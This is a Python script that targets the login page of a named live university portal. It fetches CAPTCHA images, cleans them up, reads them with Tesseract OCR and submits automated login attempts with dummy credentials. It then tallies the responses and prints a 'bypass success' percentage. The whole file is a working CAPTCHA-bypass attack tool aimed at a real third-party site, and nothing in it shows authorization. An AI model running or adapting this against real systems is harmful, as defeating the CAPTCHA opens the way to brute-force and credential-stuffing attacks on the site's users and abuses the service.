import sys, time, re, os, subprocess
import requests
import numpy as np
from PIL import Image

BASE = 'https://simkuliah.usk.ac.id/index.php'
TESS = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

import captcha_utils as cu
import datadir

N = int(sys.argv[1]) if len(sys.argv) > 1 else 20
DUMMY_U, DUMMY_P = '9999999999', 'x'
WH = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'


def ocr_full(img_pil):
    fp = os.path.join(datadir.TMP, 'ora.png')
    img_pil.save(fp)
    subprocess.run([TESS, fp, fp[:-4], '--psm', '7', '-c', f'tessedit_char_whitelist={WH}'],
                   capture_output=True)
    with open(fp[:-4] + '.txt') as f:
        txt = f.read().strip()
    return ''.join(c for c in txt if c in WH)


def classify(r):
    txt = r.text
    if 'Kode verifikasi' in txt or 'captcha' in txt.lower():
        return 'WRONG_CAPTCHA'
    if any(x in r.url for x in ('/absensi', '/dashboard', '/main')):
        return 'LOGIN_OK'
    m = re.search(r'(alert-(?:danger|warning|info|success))[^>]*>\s*([^<]{4,200})', txt, re.I)
    msg = m.group(2).strip() if m else ''
    if not msg:
        m2 = re.search(r'<title>([^<]*)</title>', txt, re.I)
        msg = m2.group(1) if m2 else ''
    return 'OTHER:' + msg[:80]


stats = {}
examples = []
won = 0
for i in range(N):
    s = cu.new_session()
    png = cu.fetch_captcha(s)
    a = cu.read_rgb(png)
    strong, _ = cu.strength(a)
    im = Image.fromarray((strong * 255).astype(np.uint8))
    w, h = im.size
    im = im.resize((w * 3, h * 3), Image.LANCZOS)
    guess = ocr_full(im)
    if len(guess) != 5:
        stats['skip(len!=5)'] = stats.get('skip(len!=5)', 0) + 1
        examples.append(f'  [skip len={len(guess)} ocr={guess!r}]')
        time.sleep(0.4)
        continue
    r = s.post(BASE + '/login/auth',
               data={'username': DUMMY_U, 'password': DUMMY_P,
                     'captcha_answer': guess},
               allow_redirects=True, timeout=25)
    cls = classify(r)
    stats[cls] = stats.get(cls, 0) + 1
    if cls == 'LOGIN_OK':
        won += 1
    examples.append(f"  ocr={guess!r:12} -> {cls}")
    time.sleep(0.4)

print(f'oracle via tess psm7: N={N} dummy={DUMMY_U}')
print('\n'.join(examples))
print('-' * 55)
for k, v in stats.items():
    print(f'  {k}: {v}')
good = stats.get('LOGIN_OK', 0)
print(f'bypass success: {good}/{N}  ({round(100*good/N, 1)}%)')